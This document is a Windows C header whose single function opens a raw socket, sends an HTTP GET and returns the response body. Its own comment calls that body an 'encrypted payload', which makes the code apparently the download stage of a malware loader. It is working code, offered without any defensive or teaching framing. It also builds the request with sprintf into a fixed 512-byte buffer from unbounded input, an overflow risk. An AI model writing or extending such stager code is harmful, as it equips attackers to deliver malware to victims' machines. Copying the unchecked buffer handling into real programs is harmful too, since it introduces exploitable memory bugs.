#pragma once
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

// ============================================================
// Fetch encrypted payload via raw HTTP GET
// Returns allocated buffer (caller must free)
// ============================================================
static BOOL fetch_payload(
    const char* host,
    int         port,
    const char* path,
    BYTE**      out_buf,
    DWORD*      out_size
) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return FALSE;

    // Resolve host
    struct addrinfo hints = {0}, *result = NULL;
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    char port_str[8];
    sprintf(port_str, "%d", port);

    if (getaddrinfo(host, port_str, &hints, &result) != 0) {
        WSACleanup();
        return FALSE;
    }

    SOCKET sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (sock == INVALID_SOCKET) {
        freeaddrinfo(result);
        WSACleanup();
        return FALSE;
    }

    if (connect(sock, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
        freeaddrinfo(result);
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }
    freeaddrinfo(result);

    // Send HTTP GET
    char request[512];
    sprintf(request,
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        path, host);

    send(sock, request, (int)strlen(request), 0);

    // Receive response
    DWORD capacity = 1024 * 64;
    DWORD total    = 0;
    BYTE* buf      = (BYTE*)malloc(capacity);
    if (!buf) { closesocket(sock); WSACleanup(); return FALSE; }

    int received;
    while ((received = recv(sock, (char*)(buf + total), capacity - total, 0)) > 0) {
        total += received;
        if (total >= capacity) {
            capacity *= 2;
            BYTE* tmp = (BYTE*)realloc(buf, capacity);
            if (!tmp) { free(buf); closesocket(sock); WSACleanup(); return FALSE; }
            buf = tmp;
        }
    }

    closesocket(sock);
    WSACleanup();

    if (total == 0) { free(buf); return FALSE; }

    // Skip HTTP headers (find \r\n\r\n)
    BYTE* body = NULL;
    DWORD body_size = 0;
    for (DWORD i = 0; i < total - 3; i++) {
        if (buf[i] == '\r' && buf[i+1] == '\n' && buf[i+2] == '\r' && buf[i+3] == '\n') {
            body = buf + i + 4;
            body_size = total - (i + 4);
            break;
        }
    }

    if (!body || body_size == 0) { free(buf); return FALSE; }

    // Copy body to output buffer
    *out_buf = (BYTE*)malloc(body_size);
    if (!*out_buf) { free(buf); return FALSE; }
    memcpy(*out_buf, body, body_size);
    *out_size = body_size;

    free(buf);
    return TRUE;
}
